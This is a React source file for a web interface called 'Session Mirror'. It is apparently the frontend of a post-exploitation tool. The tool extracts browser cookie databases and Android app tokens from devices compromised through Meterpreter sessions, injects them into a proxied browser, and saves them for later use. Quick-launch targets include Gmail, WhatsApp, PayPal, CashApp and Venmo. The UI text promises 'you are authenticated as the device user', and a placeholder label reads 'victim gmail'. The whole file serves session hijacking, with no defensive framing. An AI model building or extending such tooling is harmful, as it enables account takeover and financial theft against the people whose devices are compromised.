"use client";

import { useEffect, useRef, useState, useCallback } from "react";
import { useToast } from "@/components/toast";

// ── Types ─────────────────────────────────────────────────────────────────────
interface CookieEntry {
  name: string;
  value: string;
  valueFull?: string;
  secure: boolean;
  httpOnly: boolean;
  expires?: string;
  source?: string;
  path?: string;
}

interface CookieDomain {
  domain: string;
  count: number;
  cookies: CookieEntry[];
}

interface SavedSession {
  bid: string;
  label: string;
  createdAt: string;
  domainCount: number;
  cookieCount: number;
  sourceDevice?: string;
}

// ── App token targets ────────────────────────────────────────────────────────
const APP_TARGETS = [
  { id: "Google",    label: "Google / Gmail",     icon: "G", url: "https://mail.google.com" },
  { id: "Facebook",  label: "Facebook",           icon: "f", url: "https://m.facebook.com" },
  { id: "Instagram", label: "Instagram",          icon: "IG", url: "https://www.instagram.com" },
  { id: "Twitter",   label: "Twitter / X",        icon: "X", url: "https://twitter.com" },
  { id: "WhatsApp",  label: "WhatsApp Web",       icon: "W", url: "https://web.whatsapp.com" },
  { id: "TikTok",    label: "TikTok",             icon: "TT", url: "https://www.tiktok.com" },
  { id: "Snapchat",  label: "Snapchat",           icon: "👻", url: "https://web.snapchat.com" },
  { id: "PayPal",    label: "PayPal",             icon: "$P", url: "https://www.paypal.com" },
  { id: "CashApp",   label: "CashApp",            icon: "$", url: "https://cash.app" },
  { id: "Venmo",     label: "Venmo",              icon: "V", url: "https://account.venmo.com" },
];

const PLATFORMS = ["android", "windows", "linux", "darwin"];

// ── Sidebar panel tabs ────────────────────────────────────────────────────────
type PanelTab = "cookies" | "tokens" | "extract" | "saved";

export default function BrowserPage() {
  const { toast } = useToast();
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Browser session
  const [bid, setBid] = useState<string>("");
  const [sessionId, setSessionId] = useState<string>("");
  const [platform, setPlatform] = useState("android");

  // Navigation
  const [inputUrl, setInputUrl] = useState("https://google.com");
  const [currentUrl, setCurrentUrl] = useState("");
  const [pageTitle, setPageTitle] = useState("");
  const [proxyLoading, setProxyLoading] = useState(false);
  const [proxyError, setProxyError] = useState("");
  const [iframeSrc, setIframeSrc] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [histIdx, setHistIdx] = useState(-1);

  // Cookie panel
  const [panelTab, setPanelTab] = useState<PanelTab>("extract");
  const [cookieDomains, setCookieDomains] = useState<CookieDomain[]>([]);
  const [expandedDomain, setExpandedDomain] = useState<string | null>(null);
  const [extracting, setExtracting] = useState(false);
  const [copiedCookie, setCopiedCookie] = useState<string | null>(null);

  // App tokens
  const [tokenApp, setTokenApp] = useState("Google");
  const [extractedTokens, setExtractedTokens] = useState<Record<string, string>>({});
  const [extractingTokens, setExtractingTokens] = useState(false);

  // Saved sessions
  const [savedSessions, setSavedSessions] = useState<SavedSession[]>([]);
  const [saveLabel, setSaveLabel] = useState("");
  const [saving, setSaving] = useState(false);

  // Manual cookie injection
  const [manualCookieText, setManualCookieText] = useState("");
  const [manualDomain, setManualDomain] = useState("");

  // Sidebar collapse
  const [sidebarOpen, setSidebarOpen] = useState(true);

  // ── Init: create browser session ────────────────────────────────────────────
  useEffect(() => {
    fetch("/api/browser?action=new_session")
      .then((r) => r.json())
      .then((d) => { if (d.bid) setBid(d.bid); })
      .catch(() => toast("Failed to create browser session", "error"));

    fetch("/api/browser?action=stored_sessions")
      .then((r) => r.json())
      .then((d) => setSavedSessions(d.sessions ?? []))
      .catch(() => {});
  }, [toast]);

  // ── Listen for messages from proxied iframe ──────────────────────────────────
  useEffect(() => {
    const handler = (e: MessageEvent) => {
      if (e.data?.type === "proxy-navigate") {
        const u = e.data.url as string;
        if (u) navigate(u);
      }
      if (e.data?.type === "page-title") {
        if (e.data.title) setPageTitle(e.data.title);
      }
    };
    window.addEventListener("message", handler);
    return () => window.removeEventListener("message", handler);
  });

  // ── Fetch cookies list ───────────────────────────────────────────────────────
  const loadCookies = useCallback(async (b = bid) => {
    if (!b) return;
    try {
      const res = await fetch(`/api/browser?action=cookies&bid=${b}`);
      const d = await res.json();
      setCookieDomains(d.domains ?? []);
    } catch { /* silent */ }
  }, [bid]);

  // ── Navigate to URL via proxy ────────────────────────────────────────────────
  const navigate = useCallback(async (url: string) => {
    if (!bid) { toast("No browser session — reload", "error"); return; }
    let u = url.trim();
    if (!u.startsWith("http://") && !u.startsWith("https://")) u = "https://" + u;

    setProxyLoading(true);
    setProxyError("");
    setInputUrl(u);

    const proxied = `/api/browser?action=proxy&bid=${bid}&url=${encodeURIComponent(u)}`;
    setIframeSrc(proxied);
    setCurrentUrl(u);
    setHistory((prev) => [u, ...prev.filter((x) => x !== u).slice(0, 49)]);
    setHistIdx(0);
    setProxyLoading(false);

    // Refresh cookie panel after navigation (Set-Cookie headers may have landed)
    setTimeout(() => loadCookies(bid), 2000);
  }, [bid, toast, loadCookies]);

  // ── Extract device cookies via Meterpreter ───────────────────────────────────
  const extractCookies = async () => {
    if (!bid) { toast("No session", "error"); return; }
    if (!sessionId.trim()) { toast("Enter a Meterpreter session ID", "warning"); return; }
    setExtracting(true);
    try {
      const res = await fetch(`/api/browser?action=extract_cookies&bid=${bid}&sessionId=${sessionId}&platform=${platform}`);
      const d = await res.json();
      if (d.ok) {
        toast(`Extracted ${d.extracted} cookies from device${d.demo ? " (demo)" : ""}`, "success");
        await loadCookies();
        setPanelTab("cookies");
      } else {
        toast(d.error ?? "Extraction failed", "error");
      }
    } catch (e) {
      toast(String(e), "error");
    } finally {
      setExtracting(false);
    }
  };

  // ── Extract app tokens ────────────────────────────────────────────────────────
  const extractTokens = async () => {
    if (!sessionId.trim()) { toast("Enter a Meterpreter session ID", "warning"); return; }
    setExtractingTokens(true);
    try {
      const res = await fetch("/api/browser", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "extract_app_tokens", bid, sessionId: Number(sessionId), appId: tokenApp }),
      });
      const d = await res.json();
      if (d.ok) {
        setExtractedTokens(d.tokens ?? {});
        toast(`Found ${Object.keys(d.tokens ?? {}).length} tokens${d.demo ? " (demo)" : ""}`, "success");
      } else {
        toast(d.error ?? "Failed", "error");
      }
    } finally {
      setExtractingTokens(false);
    }
  };

  // ── Inject manual cookies ─────────────────────────────────────────────────────
  const injectManualCookies = async () => {
    if (!manualDomain.trim() || !manualCookieText.trim()) {
      toast("Enter domain and cookie string", "warning"); return;
    }
    // Parse "name=value; name2=value2" format
    const cookies = manualCookieText.split(";").map((part) => {
      const eq = part.indexOf("=");
      if (eq === -1) return null;
      return { name: part.slice(0, eq).trim(), value: part.slice(eq + 1).trim(), domain: manualDomain, path: "/", secure: false, httpOnly: false };
    }).filter(Boolean);

    const res = await fetch("/api/browser", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "set_cookies", bid, cookies }),
    });
    const d = await res.json();
    if (d.ok) {
      toast(`Injected ${d.added} cookies`, "success");
      setManualCookieText("");
      setManualDomain("");
      await loadCookies();
      setPanelTab("cookies");
    }
  };

  // ── Clear domain cookies ──────────────────────────────────────────────────────
  const clearDomain = async (domain: string) => {
    await fetch("/api/browser", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "clear_cookies", bid, domain }),
    });
    await loadCookies();
    toast(`Cleared ${domain}`, "success");
  };

  // ── Save / load session ───────────────────────────────────────────────────────
  const saveSession = async () => {
    if (!saveLabel.trim()) { toast("Enter a label", "warning"); return; }
    setSaving(true);
    try {
      const res = await fetch("/api/browser", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "save_session", bid, label: saveLabel }),
      });
      const d = await res.json();
      if (d.ok) {
        toast(`Session saved: ${d.label}`, "success");
        setSaveLabel("");
        const r2 = await fetch("/api/browser?action=stored_sessions");
        const d2 = await r2.json();
        setSavedSessions(d2.sessions ?? []);
      }
    } finally { setSaving(false); }
  };

  const loadSavedSession = async (savedId: string) => {
    const res = await fetch("/api/browser", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "load_session", bid, savedId }),
    });
    const d = await res.json();
    if (d.ok) {
      toast(`Loaded session (${d.merged} domains merged)`, "success");
      await loadCookies();
      setPanelTab("cookies");
    }
  };

  // ── Copy helper ───────────────────────────────────────────────────────────────
  const copy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCookie(label);
    setTimeout(() => setCopiedCookie(null), 1500);
  };

  // ── Quick-launch for app targets ──────────────────────────────────────────────
  const launchApp = (appUrl: string) => {
    setInputUrl(appUrl);
    navigate(appUrl);
  };

  const iframeLoaded = () => setProxyLoading(false);

  return (
    <div className="flex h-[calc(100vh-56px)] flex-col overflow-hidden">
      {/* ── Header / URL bar ──────────────────────────────────────────────── */}
      <div className="flex-shrink-0 border-b border-white/[0.05] bg-[#06060e] px-3 py-2">
        <div className="flex items-center gap-2">
          {/* Left: branding */}
          <div className="flex-shrink-0 flex items-center gap-1.5">
            <span className="text-[8px] font-bold uppercase tracking-[0.2em] text-slate-600">SESSION MIRROR</span>
            {bid && <span className="font-mono text-[8px] text-slate-700">{bid}</span>}
          </div>

          {/* Back / Forward */}
          <div className="flex gap-1">
            <button onClick={() => { const prev = history[histIdx + 1]; if (prev) { setHistIdx(h => h + 1); navigate(prev); } }}
              disabled={histIdx >= history.length - 1}
              className="rounded border border-white/[0.05] px-2 py-1 text-[10px] text-slate-600 transition hover:text-slate-400 disabled:opacity-30">←</button>
            <button onClick={() => { const next = history[histIdx - 1]; if (next) { setHistIdx(h => h - 1); navigate(next); } }}
              disabled={histIdx <= 0}
              className="rounded border border-white/[0.05] px-2 py-1 text-[10px] text-slate-600 transition hover:text-slate-400 disabled:opacity-30">→</button>
          </div>

          {/* URL input */}
          <form className="flex flex-1 gap-1.5" onSubmit={(e) => { e.preventDefault(); navigate(inputUrl); }}>
            <div className="relative flex-1">
              <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[9px] text-slate-700">
                {currentUrl ? "🔒" : "🌐"}
              </span>
              <input
                value={inputUrl}
                onChange={(e) => setInputUrl(e.target.value)}
                placeholder="https://google.com"
                className="w-full rounded border border-white/[0.06] bg-black/50 py-1.5 pl-7 pr-3 font-mono text-[11px] text-slate-200 focus:border-blue-900/60 focus:outline-none"
              />
            </div>
            <button type="submit" disabled={proxyLoading}
              className="rounded border border-blue-800/40 bg-blue-950/20 px-3 py-1.5 text-[10px] uppercase tracking-wider text-blue-400 transition hover:bg-blue-950/40 disabled:opacity-40">
              {proxyLoading ? "…" : "GO"}
            </button>
          </form>

          {/* Page title */}
          {pageTitle && (
            <span className="max-w-[180px] truncate text-[10px] text-slate-600" title={pageTitle}>{pageTitle}</span>
          )}

          {/* Cookie count badge */}
          {cookieDomains.length > 0 && (
            <button onClick={() => setPanelTab("cookies")}
              className="flex-shrink-0 rounded border border-green-900/40 bg-green-950/20 px-2 py-1 text-[9px] text-green-400">
              🍪 {cookieDomains.reduce((a, b) => a + b.count, 0)} cookies · {cookieDomains.length} domains
            </button>
          )}

          {/* Toggle sidebar */}
          <button onClick={() => setSidebarOpen(o => !o)}
            className="rounded border border-white/[0.05] px-2 py-1 text-[10px] text-slate-600 hover:text-slate-400">
            {sidebarOpen ? "◀" : "▶"}
          </button>
        </div>

        {/* Quick-launch row */}
        <div className="mt-1.5 flex flex-wrap gap-1">
          {APP_TARGETS.map((a) => (
            <button key={a.id} onClick={() => launchApp(a.url)}
              className="rounded border border-white/[0.04] px-2 py-0.5 text-[9px] text-slate-600 transition hover:border-white/[0.1] hover:text-slate-400">
              {a.icon} {a.label}
            </button>
          ))}
        </div>
      </div>

      {/* ── Main split: iframe + sidebar ─────────────────────────────────── */}
      <div className="flex flex-1 overflow-hidden">

        {/* ── Proxy iframe ─────────────────────────────────────────────────── */}
        <div className="relative flex-1 bg-black">
          {!iframeSrc && (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-4">
              <div className="text-center">
                <p className="text-[9px] font-semibold uppercase tracking-[0.2em] text-slate-700">Session Mirror Browser</p>
                <p className="mt-2 text-[13px] font-semibold text-slate-400">Load device cookies, then browse as the target</p>
                <p className="mt-1 text-[11px] text-slate-700">1 · Extract cookies from a Meterpreter session → 2 · Navigate to any site → 3 · You are authenticated as the device user</p>
              </div>
              <div className="grid grid-cols-2 gap-2 max-w-md w-full">
                {APP_TARGETS.slice(0, 6).map((a) => (
                  <button key={a.id} onClick={() => launchApp(a.url)}
                    className="rounded border border-white/[0.05] bg-white/[0.02] px-4 py-3 text-left transition hover:bg-white/[0.04]">
                    <p className="text-[11px] font-semibold text-slate-300">{a.icon} {a.label}</p>
                    <p className="mt-0.5 truncate font-mono text-[9px] text-slate-700">{a.url}</p>
                  </button>
                ))}
              </div>
              <p className="text-[9px] text-slate-800">Or type a URL in the bar above and press GO</p>
            </div>
          )}

          {proxyLoading && iframeSrc && (
            <div className="absolute inset-x-0 top-0 z-10 h-0.5 overflow-hidden bg-slate-900">
              <div className="h-full animate-pulse bg-blue-500" style={{ width: "70%" }} />
            </div>
          )}

          {proxyError && (
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="max-w-md text-center">
                <p className="text-[11px] font-semibold text-red-400">Failed to load page</p>
                <p className="mt-1 font-mono text-[10px] text-slate-600">{proxyError}</p>
                <button onClick={() => { setProxyError(""); navigate(currentUrl); }}
                  className="mt-3 rounded border border-white/[0.06] px-3 py-1.5 text-[10px] text-slate-500 hover:text-slate-300">
                  Retry
                </button>
              </div>
            </div>
          )}

          {iframeSrc && (
            <iframe
              ref={iframeRef}
              src={iframeSrc}
              onLoad={iframeLoaded}
              onError={() => { setProxyLoading(false); setProxyError("Page failed to load — site may block embedding"); }}
              className="h-full w-full border-0"
              sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"
              title="Session Mirror Browser"
            />
          )}
        </div>

        {/* ── Sidebar ───────────────────────────────────────────────────────── */}
        {sidebarOpen && (
          <div className="flex w-80 flex-shrink-0 flex-col border-l border-white/[0.05] bg-[#06060e]">

            {/* Panel tab bar */}
            <div className="flex flex-shrink-0 border-b border-white/[0.05]">
              {(["extract", "cookies", "tokens", "saved"] as PanelTab[]).map((t) => (
                <button key={t} onClick={() => setPanelTab(t)}
                  className={`flex-1 py-2 text-[9px] font-semibold uppercase tracking-wider transition ${panelTab === t ? "border-b border-blue-500 text-blue-400" : "text-slate-600 hover:text-slate-400"}`}>
                  {t === "extract" ? "Extract" : t === "cookies" ? `Cookies${cookieDomains.length > 0 ? ` (${cookieDomains.length})` : ""}` : t === "tokens" ? "Tokens" : "Saved"}
                </button>
              ))}
            </div>

            <div className="flex-1 overflow-y-auto p-3 space-y-4">

              {/* ── EXTRACT TAB ──────────────────────────────────────────── */}
              {panelTab === "extract" && (
                <div className="space-y-4">
                  {/* Device extraction */}
                  <div className="space-y-2">
                    <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">Extract from Device</p>
                    <p className="text-[10px] text-slate-700">Downloads the browser's SQLite cookie database via Meterpreter and injects all cookies into this session.</p>
                    <div className="space-y-1.5">
                      <input
                        value={sessionId}
                        onChange={(e) => setSessionId(e.target.value)}
                        placeholder="Meterpreter session ID (e.g. 1)"
                        className="w-full rounded border border-white/[0.06] bg-black/50 px-3 py-1.5 font-mono text-[11px] text-slate-200 focus:border-blue-900/60 focus:outline-none"
                      />
                      <select value={platform} onChange={(e) => setPlatform(e.target.value)}
                        className="w-full rounded border border-white/[0.06] bg-black/50 px-3 py-1.5 text-[11px] text-slate-300 focus:outline-none">
                        {PLATFORMS.map((p) => <option key={p} value={p}>{p}</option>)}
                      </select>
                      <button onClick={extractCookies} disabled={extracting}
                        className="w-full rounded border border-blue-800/50 bg-blue-950/20 py-2 text-[10px] uppercase tracking-wider text-blue-400 transition hover:bg-blue-950/40 disabled:opacity-40">
                        {extracting ? "Extracting…" : "Extract Browser Cookies"}
                      </button>
                    </div>
                    <p className="text-[9px] text-slate-800">Targets: Chrome, Samsung Internet, Brave, Firefox, Opera · Requires root for most paths</p>
                  </div>

                  {/* Manual injection */}
                  <div className="space-y-2">
                    <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">Manual Cookie Injection</p>
                    <p className="text-[10px] text-slate-700">Paste a raw cookie string from DevTools or a captured session.</p>
                    <div className="space-y-1.5">
                      <input
                        value={manualDomain}
                        onChange={(e) => setManualDomain(e.target.value)}
                        placeholder="Domain (e.g. .google.com)"
                        className="w-full rounded border border-white/[0.06] bg-black/50 px-3 py-1.5 font-mono text-[11px] text-slate-200 focus:border-blue-900/60 focus:outline-none"
                      />
                      <textarea
                        value={manualCookieText}
                        onChange={(e) => setManualCookieText(e.target.value)}
                        rows={3}
                        placeholder="name=value; name2=value2; …"
                        className="w-full resize-none rounded border border-white/[0.06] bg-black/50 px-3 py-2 font-mono text-[10px] text-slate-200 focus:border-blue-900/60 focus:outline-none"
                      />
                      <button onClick={injectManualCookies}
                        className="w-full rounded border border-slate-800/60 py-1.5 text-[10px] uppercase tracking-wider text-slate-400 transition hover:text-slate-200">
                        Inject Cookies
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* ── COOKIES TAB ──────────────────────────────────────────── */}
              {panelTab === "cookies" && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">
                      {cookieDomains.reduce((a, b) => a + b.count, 0)} Cookies · {cookieDomains.length} Domains
                    </p>
                    <button onClick={() => loadCookies()}
                      className="text-[9px] text-slate-700 hover:text-slate-500">↻ Refresh</button>
                  </div>

                  {cookieDomains.length === 0 && (
                    <div className="rounded border border-dashed border-white/[0.04] py-8 text-center">
                      <p className="text-[10px] text-slate-700">No cookies loaded</p>
                      <p className="mt-1 text-[9px] text-slate-800">Use Extract tab to pull from device</p>
                    </div>
                  )}

                  {cookieDomains.map((d) => (
                    <div key={d.domain} className="rounded border border-white/[0.04] overflow-hidden">
                      <button
                        onClick={() => setExpandedDomain(expandedDomain === d.domain ? null : d.domain)}
                        className="flex w-full items-center justify-between bg-white/[0.02] px-3 py-2 text-left hover:bg-white/[0.03]">
                        <div>
                          <p className="font-mono text-[10px] text-slate-300">{d.domain}</p>
                          <p className="text-[8px] text-slate-700">{d.count} cookies</p>
                        </div>
                        <div className="flex items-center gap-2">
                          <button
                            onClick={(e) => { e.stopPropagation(); copy(d.cookies.map((c) => `${c.name}=${c.valueFull ?? c.value}`).join("; "), d.domain + "_all"); }}
                            className="rounded border border-white/[0.04] px-2 py-0.5 text-[8px] text-slate-600 hover:text-slate-400">
                            {copiedCookie === d.domain + "_all" ? "✓" : "Copy All"}
                          </button>
                          <button
                            onClick={(e) => { e.stopPropagation(); navigate("https://" + d.domain.replace(/^\./, "")); }}
                            className="rounded border border-blue-900/30 px-2 py-0.5 text-[8px] text-blue-500 hover:text-blue-400">
                            Open ↗
                          </button>
                          <button
                            onClick={(e) => { e.stopPropagation(); clearDomain(d.domain); }}
                            className="text-[8px] text-slate-700 hover:text-red-500">✕</button>
                          <span className="text-[8px] text-slate-700">{expandedDomain === d.domain ? "▲" : "▼"}</span>
                        </div>
                      </button>

                      {expandedDomain === d.domain && (
                        <div className="divide-y divide-white/[0.03]">
                          {d.cookies.map((c) => (
                            <div key={c.name} className="px-3 py-2 hover:bg-white/[0.01]">
                              <div className="flex items-start justify-between gap-2">
                                <div className="flex-1 min-w-0">
                                  <div className="flex items-center gap-1.5">
                                    <span className="font-mono text-[10px] font-semibold text-slate-300 truncate">{c.name}</span>
                                    {c.secure && <span className="text-[7px] text-green-600">🔒</span>}
                                    {c.httpOnly && <span className="text-[7px] text-slate-700">H</span>}
                                    {c.source && <span className="text-[7px] text-slate-800">{c.source}</span>}
                                  </div>
                                  <p className="font-mono text-[9px] text-slate-600 truncate mt-0.5">{c.value}</p>
                                </div>
                                <button
                                  onClick={() => copy(c.valueFull ?? c.value, c.name)}
                                  className="flex-shrink-0 rounded border border-white/[0.04] px-2 py-0.5 text-[8px] text-slate-600 hover:text-slate-300">
                                  {copiedCookie === c.name ? "✓" : "Copy"}
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  ))}

                  {/* Save session button */}
                  {cookieDomains.length > 0 && (
                    <div className="mt-3 space-y-1.5 border-t border-white/[0.04] pt-3">
                      <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">Save Session</p>
                      <div className="flex gap-1.5">
                        <input value={saveLabel} onChange={(e) => setSaveLabel(e.target.value)}
                          placeholder="Label (e.g. victim gmail)"
                          className="flex-1 rounded border border-white/[0.06] bg-black/50 px-2 py-1 text-[10px] text-slate-300 focus:outline-none" />
                        <button onClick={saveSession} disabled={saving}
                          className="rounded border border-slate-700/50 px-3 py-1 text-[9px] uppercase tracking-wider text-slate-500 hover:text-slate-300 disabled:opacity-40">
                          {saving ? "…" : "Save"}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* ── TOKENS TAB ───────────────────────────────────────────── */}
              {panelTab === "tokens" && (
                <div className="space-y-4">
                  <div className="space-y-2">
                    <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">App Session Tokens</p>
                    <p className="text-[10px] text-slate-700">Extracts OAuth tokens, auth keys and session IDs from the app's SharedPreferences on Android. Use these to access APIs directly.</p>
                    <div className="space-y-1.5">
                      <input
                        value={sessionId}
                        onChange={(e) => setSessionId(e.target.value)}
                        placeholder="Meterpreter session ID"
                        className="w-full rounded border border-white/[0.06] bg-black/50 px-3 py-1.5 font-mono text-[11px] text-slate-200 focus:outline-none"
                      />
                      <select value={tokenApp} onChange={(e) => setTokenApp(e.target.value)}
                        className="w-full rounded border border-white/[0.06] bg-black/50 px-3 py-1.5 text-[11px] text-slate-300 focus:outline-none">
                        {APP_TARGETS.map((a) => <option key={a.id} value={a.id}>{a.icon} {a.label}</option>)}
                      </select>
                      <button onClick={extractTokens} disabled={extractingTokens}
                        className="w-full rounded border border-purple-800/50 bg-purple-950/20 py-2 text-[10px] uppercase tracking-wider text-purple-400 transition hover:bg-purple-950/40 disabled:opacity-40">
                        {extractingTokens ? "Extracting…" : "Extract App Tokens"}
                      </button>
                    </div>
                  </div>

                  {Object.entries(extractedTokens).length > 0 && (
                    <div className="space-y-1">
                      <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">Extracted Tokens</p>
                      {Object.entries(extractedTokens).map(([key, val]) => (
                        <div key={key} className="rounded border border-white/[0.04] bg-white/[0.01] p-2">
                          <div className="flex items-center justify-between">
                            <p className="text-[9px] font-semibold text-slate-500">{key}</p>
                            <button onClick={() => copy(val, key)}
                              className="text-[8px] text-slate-700 hover:text-slate-400">
                              {copiedCookie === key ? "✓ Copied" : "Copy"}
                            </button>
                          </div>
                          <p className="mt-0.5 font-mono text-[9px] text-green-400 break-all">{val}</p>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Open the app target */}
                  <div className="space-y-1">
                    <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">Open in Browser</p>
                    <div className="grid grid-cols-2 gap-1">
                      {APP_TARGETS.map((a) => (
                        <button key={a.id} onClick={() => launchApp(a.url)}
                          className="rounded border border-white/[0.04] px-2 py-1.5 text-left transition hover:bg-white/[0.02]">
                          <p className="text-[9px] text-slate-400">{a.icon} {a.label}</p>
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              {/* ── SAVED TAB ────────────────────────────────────────────── */}
              {panelTab === "saved" && (
                <div className="space-y-2">
                  <p className="text-[9px] font-semibold uppercase tracking-widest text-slate-600">Saved Sessions</p>
                  <p className="text-[10px] text-slate-700">Previously saved cookie sessions. Load one to resume browsing as that device user.</p>

                  {savedSessions.length === 0 && (
                    <div className="rounded border border-dashed border-white/[0.04] py-8 text-center">
                      <p className="text-[10px] text-slate-700">No saved sessions</p>
                      <p className="mt-1 text-[9px] text-slate-800">Save the Cookies tab after extracting</p>
                    </div>
                  )}

                  {savedSessions.map((s) => (
                    <div key={s.bid} className="rounded border border-white/[0.05] bg-white/[0.01] p-3">
                      <div className="flex items-start justify-between">
                        <div>
                          <p className="text-[11px] font-semibold text-slate-300">{s.label}</p>
                          <p className="text-[9px] text-slate-600">{s.cookieCount} cookies · {s.domainCount} domains</p>
                          {s.sourceDevice && <p className="text-[9px] text-slate-700">{s.sourceDevice}</p>}
                          <p className="text-[8px] text-slate-800">{new Date(s.createdAt).toLocaleString()}</p>
                        </div>
                        <button onClick={() => loadSavedSession(s.bid)}
                          className="rounded border border-blue-800/40 bg-blue-950/20 px-3 py-1.5 text-[9px] uppercase tracking-wider text-blue-400 hover:bg-blue-950/40">
                          Load
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* ── Bottom status bar ───────────────────────────────────── */}
            <div className="flex-shrink-0 border-t border-white/[0.04] px-3 py-1.5 text-[8px] text-slate-700">
              {currentUrl ? (
                <span className="truncate font-mono">{currentUrl}</span>
              ) : (
                <span>No page loaded · Enter URL above</span>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
